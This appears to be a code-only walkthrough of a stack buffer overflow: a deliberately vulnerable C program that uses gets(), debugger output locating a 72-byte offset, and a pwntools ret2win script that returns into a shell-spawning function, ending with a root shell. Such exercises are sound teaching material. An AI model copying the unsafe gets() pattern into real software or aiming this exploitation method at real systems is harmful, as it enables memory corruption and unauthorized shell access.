```c
#include <stdio.h>
#include <stdlib.h>

void pwn() {
    system("/bin/bash");
}

int main() {

    char name[50];
    printf("[*] name: ");
    gets(name);
    printf("[*] hello, %s\n", name);
    setbuf(stdout, NULL);

    return 0;
}

// gcc test.c -o test -std=c99 -z execstack -no-pie
```
```bash
0000000000401156 <pwn>:
  401156:    55                       push   %rbp
  401157:    48 89 e5                 mov    %rsp,%rbp
  40115a:    48 8d 05 a3 0e 00 00     lea    0xea3(%rip),%rax        # 402004 <_IO_stdin_used+0x4>
  401161:    48 89 c7                 mov    %rax,%rdi
  401164:    e8 d7 fe ff ff           call   401040 <system@plt>
  401169:    90                       nop
  40116a:    5d                       pop    %rbp
  40116b:    c3                       ret
```
```bash
root@fsociety:~/bof# ./test 
[*] name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[*] hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```
```bash
root@fsociety:~/bof# pwn cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```
```bash
pwndbg> r
Starting program: /root/bof/test 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
[*] name: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
[*] hello, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
0x00000000004011c9 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────
 RAX  0
 RBX  0x7fffffffdbc8 —▸ 0x7fffffffdf72 ◂— '/root/bof/test'
 RCX  6
 RDX  0x7ffff7e17790 (_IO_stdfile_1_lock) ◂— 0
 RDI  0x405310 ◂— 0x405
 RSI  0x405010 ◂— 0x7000700070007
 R8   0xffffffff
 R9   0x411
 R10  0xa102d5a56a633b90
 R11  0x7ffff7c882e0 (setbuf) ◂— mov edx, 0x2000
 R12  0
 R13  0x7fffffffdbd8 —▸ 0x7fffffffdf81 ◂— 'SHELL=/bin/bash'
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2f0 ◂— 0
 R15  0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401120 (__do_global_dtors_aux) ◂— endbr64 
 RBP  0x6161617261616171 ('qaaaraaa')
 RSP  0x7fffffffdab8 ◂— 'saaataaauaaavaaawaaaxaaayaaa'
 RIP  0x4011c9 (main+93) ◂— ret 
─────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────
 ► 0x4011c9 <main+93>    ret                                <0x6161617461616173>
    ↓









───────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdab8 ◂— 'saaataaauaaavaaawaaaxaaayaaa'
01:0008│     0x7fffffffdac0 ◂— 'uaaavaaawaaaxaaayaaa'
02:0010│     0x7fffffffdac8 ◂— 'waaaxaaayaaa'
03:0018│     0x7fffffffdad0 ◂— 0x61616179 /* 'yaaa' */
04:0020│     0x7fffffffdad8 —▸ 0x7fffffffdbc8 —▸ 0x7fffffffdf72 ◂— '/root/bof/test'
05:0028│     0x7fffffffdae0 —▸ 0x7fffffffdbc8 —▸ 0x7fffffffdf72 ◂— '/root/bof/test'
06:0030│     0x7fffffffdae8 ◂— 0xa1a42c58e3625700
07:0038│     0x7fffffffdaf0 ◂— 0
─────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────
 ► 0         0x4011c9 main+93
   1 0x6161617461616173 None
   2 0x6161617661616175 None
   3 0x6161617861616177 None
   4       0x61616179 None
   5   0x7fffffffdbc8 None
   6   0x7fffffffdbc8 None
   7 0xa1a42c58e3625700 None
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
```bash
root@fsociety:~/bof# pwn cyclic -l saaataaa
72
```
```bash
pwndbg> r
Starting program: /root/bof/test 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
[*] name: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaaBBBBBBBB
[*] hello, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaaBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x00000000004011c9 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────
 RAX  0
 RBX  0x7fffffffdbc8 —▸ 0x7fffffffdf72 ◂— '/root/bof/test'
 RCX  6
 RDX  0x7ffff7e17790 (_IO_stdfile_1_lock) ◂— 0
 RDI  0x405310 ◂— 0x405
 RSI  0x405010 ◂— 0x7000700070007
 R8   0xffffffff
 R9   0x411
 R10  0x938b1325fdb70812
 R11  0x7ffff7c882e0 (setbuf) ◂— mov edx, 0x2000
 R12  0
 R13  0x7fffffffdbd8 —▸ 0x7fffffffdf81 ◂— 'SHELL=/bin/bash'
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2f0 ◂— 0
 R15  0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401120 (__do_global_dtors_aux) ◂— endbr64 
 RBP  0x6161617261616171 ('qaaaraaa')
 RSP  0x7fffffffdab8 ◂— 'BBBBBBBB'
 RIP  0x4011c9 (main+93) ◂— ret 
─────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────
 ► 0x4011c9 <main+93>    ret                                <0x4242424242424242>
```
```bash
root@fsociety:~/bof# objdump -d ./test | grep ret
  401016:    c3                       ret
  4010a0:    c3                       ret
  4010d0:    c3                       ret
  401110:    c3                       ret
  40113e:    c3                       ret
  401140:    c3                       ret
  40116b:    c3                       ret
  4011c9:    c3                       ret
  4011d4:    c3                       ret
```
```py
from pwn import *

pwn_addr = b"\x56\x11\x40\x00\x00\x00\x00\x00"
ret      = b"\xc9\x11\x40\x00\x00\x00\x00\x00" # alignment
nops     = b"\x90"
offset   = 72

r = process("./test")
r.sendline(offset * nops + ret + pwn_addr)
r.interactive()
```
```bash
root@fsociety:~/bof# python3 xpl.py 
[+] Starting local process './test': pid 20035
[*] Switching to interactive mode
[*] name: [*] hello, \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc9\x11@
$ id
uid=0(root) gid=0(root) groups=0(root)
$ whoami
root
```